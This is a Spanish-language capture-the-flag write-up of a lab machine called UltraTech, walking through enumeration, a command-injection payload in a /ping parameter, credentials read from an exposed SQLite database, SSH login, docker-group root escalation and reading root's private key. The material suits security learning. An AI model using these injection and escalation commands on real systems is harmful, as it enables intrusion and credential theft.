# UltraTech - Writeup

## Información Inicial
- **IP objetivo:** 10.10.60.234
- **Sistema:** Ubuntu 18.04.2 LTS
- **Servicios detectados:**  
  - Apache (HTTP - puerto 31331)  
  - Servicio web en puerto 8081  

## Enumeración
Se accedió al sitio web principal (`index.html`) y se encontraron rutas adicionales:
- `/what.html`
- `/partners.html`
- `/utech_sitemap.txt`

En el puerto **8081** existía un endpoint vulnerable:  
```
http://10.10.60.234:8081/ping?ip=google.com
```

El parámetro `ip` era susceptible a **Command Injection**.

## Explotación
Prueba de inyección:
```
http://10.10.60.234:8081/ping?ip=10.6.15.252;`ls`
```

Extracción de credenciales desde base de datos SQLite expuesta:
```
cat utech.db.sqlite
```
Credenciales obtenidas:
- Usuario: `r00t`
- Password: `n100906`
- Hash: `f357a0c52799563c7c7b76c1e7543a32` (posiblemente MD5 → mrsheafy)

Acceso SSH:
```
ssh r00t@10.10.60.234
Password: n100906
```

## Post-Explotación
Información del sistema:
```
lsb_release -a
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.2 LTS
Release:        18.04
```
```
id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

El usuario pertenece al grupo **docker**, lo que permite escalar privilegios.

## Escalada de Privilegios
Ejecutando contenedor con privilegios de root y montando el sistema de archivos:
```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
Esto otorga acceso root al host.

Se accedieron a las llaves SSH del sistema:
```
cd /root/.ssh
cat id_rsa
```

Con la llave privada fue posible conectarse directamente como root.

## Conclusión
La máquina UltraTech presentaba:
1. **Command Injection** en endpoint `/ping` (puerto 8081).  
2. Exposición de base de datos con credenciales.  
3. Usuario en grupo **docker** con privilegios de root.  

### Vector final:  
- Inyección de comandos → Credenciales → SSH → Docker → Root.  

## Herramientas utilizadas
- Nmap
- BurpSuite / cURL
- SQLite3
- SSH
- Docker

---
**Rooted by: chepeto**
